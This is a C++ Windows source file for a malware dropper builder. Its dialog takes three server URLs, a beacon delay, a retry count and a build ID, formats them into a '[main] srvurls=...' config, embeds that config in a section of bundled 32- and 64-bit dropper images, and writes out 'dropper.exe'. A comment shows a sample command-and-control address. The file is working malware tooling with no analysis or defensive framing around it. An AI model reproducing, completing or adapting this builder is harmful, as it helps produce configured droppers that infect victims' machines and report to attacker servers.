#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <psapi.h>
#include <imagehlp.h>
#include <tlhelp32.h>

#include "utils.h"
#include "peldr.h"
#include "seccfg.h"

#include "vcxproj/resource.h"

namespace Dropper32Hex
{
#include "sdropper32-hex.h"
}

namespace Dropper64Hex
{
#include "sdropper64-hex.h"
}

BOOL BuildDropper(LPSTR Data)
{
	BOOL bOk = FALSE;
	PVOID Dropper32Image;
	DWORD_PTR Dropper32ImageSize;
	SecCfg::SECTION_CONFIG SectionConfig;

	SectionConfig.Name = SECCFG_SECTION_NAME;
	SectionConfig.Config = (PVOID)Data;
	SectionConfig.Raw.ConfigSize = strlen(Data)+1;

	SectionConfig.Image = Dropper64Hex::data;
	SectionConfig.Raw.ImageSize = sizeof(Dropper64Hex::data);

	if (SecCfg::InsertSectionConfig(&SectionConfig, Dropper32Hex::data, sizeof(Dropper32Hex::data), &Dropper32Image, &Dropper32ImageSize, FALSE))
	{
		bOk = Utils::FileWrite("dropper.exe", CREATE_ALWAYS, Dropper32Image, Dropper32ImageSize);
	}

	return bOk;
}

int WINAPI MainDlgProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	if (message == WM_INITDIALOG)
	{
		
	}

	if (message == WM_COMMAND)
	{
		if (wParam == IDOK)
		{
			//http://192.168.179.2/sana/data.php

			CHAR Url1[260] = {0};
			CHAR Url2[260] = {0};
			CHAR Url3[260] = {0};
			CHAR Delay[20] = {0};
			CHAR Retry[20] = {0};
			CHAR Build[100] = {0};

			GetDlgItemText(hWnd, IDC_URL1, Url1, sizeof(Url1));
			GetDlgItemText(hWnd, IDC_URL2, Url2, sizeof(Url2));
			GetDlgItemText(hWnd, IDC_URL3, Url3, sizeof(Url3));
			GetDlgItemText(hWnd, IDC_DELAY, Delay, sizeof(Delay));
			GetDlgItemText(hWnd, IDC_RETRY, Retry, sizeof(Retry));
			GetDlgItemText(hWnd, IDC_BUILD, Build, sizeof(Build));

			CHAR CreatedConfig[1024] = {0};
			
			sprintf(CreatedConfig, "[main]\r\nsrvurls=%s;%s;%s\r\nsrvdelay=%s\r\nsrvretry=%s\r\nbuildid=%s\r\n", Url1, Url2, Url3, Delay, Retry, Build);

			if (BuildDropper(CreatedConfig))
			{
				MessageBox(0, "OK", "OK", MB_OK);
			}

			return 0;
		}


		if (wParam == IDCANCEL)
		{
			return EndDialog(hWnd, 0), ExitProcess(0), 0;
		}
	}

	return 0;
}

VOID Entry()
{
	if (DialogBoxParam(0, MAKEINTRESOURCE(IDD_DIALOG1), 0, MainDlgProc, 0) == -1)
	{
		MessageBox(0, "DialogBoxParam failed", 0, MB_ICONHAND);
	}
}
